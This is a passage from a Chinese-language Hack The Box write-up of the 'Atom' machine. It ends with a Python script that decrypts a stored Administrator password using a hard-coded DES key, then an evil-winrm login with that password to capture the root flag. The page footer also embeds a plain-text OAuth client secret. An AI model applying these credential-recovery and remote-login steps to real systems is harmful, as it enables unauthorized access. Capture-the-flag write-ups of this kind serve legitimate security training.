+<p>Odh7N3L9aVSeHQmgK&#x2F;nj7RQL8MEYCUMb</p>
+<p>这时候开动我们机灵的小脑瓜，动起我们勤劳的小手，小小的修改一下exp</p>
+<pre><code class="cpp">import json
+import base64
+from des import * #python3 -m pip install des
+import sys
+
+def decode(hash):
+hash = base64.b64decode(hash.encode(&#39;utf-8&#39;))
+key = DesKey(b&quot;7ly6UznJ&quot;)
+return key.decrypt(hash,initial=b&quot;XuVUm5fR&quot;,padding=True).decode(&#39;utf-8&#39;)
+print(decode(&#39;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#39;))
+</code></pre>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/4538043d-86b4-4f9a-9c95-2a5538bb127a.png" class>
+
+<p>执行一下这个脚本</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/5a78848e-2539-43eb-8160-41b16bab2a67.png" class>
+
+<p>成功得到Administrator的密码kidvscat_admin_@123</p>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/58206c5f-6b3f-4e44-a467-add1442634ff.png" class>
+
+<p>我们可以看到5985端口是开启的</p>
+<p>别问我怎么知道，因为思路卡壳的我，想了一晚上</p>
+<p>NB吗？用头发换的</p>
+<p>经过Google，我们发现5985端口是WinRM程序使用的端口</p>
+<p>那咱们就根据文档来利用吧</p>
+<p>注意，在kali中安装winrm的指令是</p>
+<pre><code class="cpp">gem install evil-winrm
+</code></pre>
+<p>安装好后使用evil-winrm进行登录</p>
+<pre><code class="cpp">evil-winrm -i 10.10.10.237 -u &#39;administrator&#39; -p &#39;kidvscat_admin_@123&#39;
+</code></pre>
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/6c83bbff-2a3c-4a69-8be2-4f57872ec033.png" class>
+
+<img src="/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/f35152b2-72e4-4b20-88b4-fc6d5bfed0cf.png" class>
+
+<p>成功拿到root权限的flag</p>
+<p>收工睡觉</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/&title=《Atom - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/&title=《Atom - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Atom - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Pit - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2021/06/04/Hackthebox/Medium/Hackthebox-Schooled/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Schooled - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/&title=《Atom - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/&title=《Atom - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Atom - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACoElEQVR42u3aO5LCQAwFQO5/aTYlwTx9xuugHVFgm+kJRipJr1d8vT+u6vefv36789tT18+uXXh4eHiDpV+/Or8zQV6/53oTC2/Aw8PDO8b79tLknnxrkn+5Djb5mvHw8PCew8s/XyfBedJcvRMPDw/v+bzqIT7H4+Hh4T2B1ysx9EqxSdm3V/DFw8PDu4eXd5Ge8/lIfw8PDw9v3FXvHe7VUJEPHJRXi4eHh3eAlx+4eapdLSgkJYneOvHw8PDu5E2aUr1DPy95lIu5eHh4eKu8rT/LQ8LkznLYwMPDwzvAmywo/yYvbVSDQWFT8PDw8I7xekl2teSahJZqkHhNYggeHh7e6lhAdbBpfs9k9OpHrQUPDw/vAO/E0V9thuUtseR7PDw8vBO8vMw6KRZMRhMmTTU8PDy8XV6eNPeKCL1SbC8F/zE6gIeHh7fEmwMmBd9Jq6zaosPDw8Pb5fWO6V4HqlrOyBPxZgMMDw8Pb9x5v15K3jCbNMOq7yxsDR4eHt6Y12tlTRaapM7zcYSo1oKHh4e3xJuEinxrzjXb8PDw8O7h7RZhqxuRLL05dIWHh4d3gFc91rdS7UnVpDqAhYeHh3eO10t2T2xHdazqx/vx8PDwDvOqDycF2bzEUN2aqOWGh4eHd4yXp7P5QqtL7DW6fjyFh4eHd4yXB4Z56fZE8MDDw8P7L15eOJiPC/TKteULDw8Pb5X3Ll67W9MLQnnSj4eHh3eCt3XG9gJJsuje9i2HEDw8PLzVpfeWOwkbyUbg4eHh3cObpMu9xtgoCZ5MbOHh4eHdzssT3OsAk5OSf/+6TXh4eHgP4G0tN9+gvJ+1HPfw8PDwxsWI3nBqrwCRFzKiwICHh4e3yqsmtfmYVHUMK2+bHSxY4OHh4V1df+LukpdYPGVnAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
